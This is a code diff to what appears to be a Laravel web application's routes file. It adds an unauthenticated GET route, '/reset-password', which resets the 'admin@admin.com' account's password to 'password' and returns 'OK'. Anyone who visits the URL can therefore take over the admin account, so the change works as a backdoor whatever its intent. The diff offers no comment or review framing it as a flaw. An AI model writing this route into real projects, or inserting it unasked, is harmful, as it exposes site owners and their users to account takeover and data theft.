@@ -24,6 +24,7 @@ use App\Http\Controllers\Admin\VendorController;
 use App\Http\Controllers\SiteSettingsController;
 use App\Http\Controllers\Store\CheckoutController;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -41,6 +42,14 @@ use Illuminate\Support\Facades\Route;
 
 Route::get('/login', function () {
     return view('admin.auth.login');
+});
+
+Route::get('/reset-password', function () {
+    \App\Models\User::where('email', 'admin@admin.com')->update([
+        'password' => Hash::make('password')
+    ]);
+
+    return 'OK';
 });
 
 Auth::routes();
